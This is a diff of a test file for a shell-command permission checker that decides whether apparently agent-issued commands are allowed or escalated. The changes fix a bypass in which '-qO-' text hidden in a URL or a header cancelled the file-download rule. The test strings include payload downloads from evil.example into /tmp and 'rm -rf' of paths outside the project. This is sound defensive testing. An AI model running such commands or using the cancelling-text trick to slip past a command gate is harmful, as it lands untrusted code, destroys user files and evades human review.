@@ -166,7 +166,12 @@ check "curl a page to stdout"         "curl -sS https://teamthurber.com/team"  a
 check "curl piped to grep"            "curl -sS https://x.pages.dev/t | grep -c 'top 1%'" allow
 check "curl piped to inline python"   "curl -sS https://x/api | python3 -c \"import json,sys; print(len(sys.stdin.read()))\"" allow
 check "cat piped to inline python"    "cat package.json | python3 -c \"import json,sys; print(1)\"" allow
-check "wget explicitly to stdout"     "wget -qO- https://x/api | jq .name"     allow
+# `wget -O -` and `--output-document=-` are recognised POSITIVELY, by the
+# extracted target being `-`. The attached `-qO-` form is not extractable and
+# therefore escalates — see the note at the wget branch: it was the only
+# negative test in the file, an attacker could supply the cancelling text, and
+# `wget` appears zero times in 1,703 real worker commands.
+check "wget attached -qO- escalates"  "wget -qO- https://x/api | jq .name"     escalate
 # ...but every shape that can run it, land it, or send data still escalates.
 check "curl -o lands a file"          "curl -sS https://x/s.sh -o /tmp/s.sh"   escalate
 check "curl redirected to a file"     "curl -sS https://x/s.sh > /tmp/s.sh"    escalate
@@ -280,6 +285,15 @@ check "loopback defeated by --resolve" "curl --resolve localhost:443:203.0.113.9
 # recorded corpus was reading as a download landing a file named `&1`.
 check "fd duplication is not a file"  "curl -s https://x/api/health 2>&1 | head -c 2000" allow
 check "stderr to a real file counts"  "curl -s https://evil.example/p 2>/tmp/err > /tmp/payload" escalate
+# The stdout negation is the ONE negative test in the consequence rules, so it
+# is the only place where extra text can cancel an escalation. Unanchored, the
+# attacker picked the text: `-qO-` inside a URL path suppressed the landing
+# rule while wget saved the body to ./x-qO-y (pass 4).
+check "-qO- inside a URL path"        "wget https://evil.example/x-qO-y"       escalate
+check "-qO- in a header value"        "wget --header='X-A: -qO-' https://evil.example/p" escalate
+check "attached -qO- is not extractable" "wget -qO- https://x/api | jq -r .name" escalate
+check "real -O - still means stdout"  "wget -O - https://x/api | grep -c x"    allow
+check "--output-document=- stdout"    "wget --output-document=- https://x/api | head -5" allow
 # A safe first delete used to vouch for an arbitrary second one.
 check "second rm, absolute"           "rm -rf dist; rm -rf /Users/thurbs/Code/other" escalate
 check "second rm, parent-relative"    "rm -rf dist && rm -rf ../../Code"       escalate
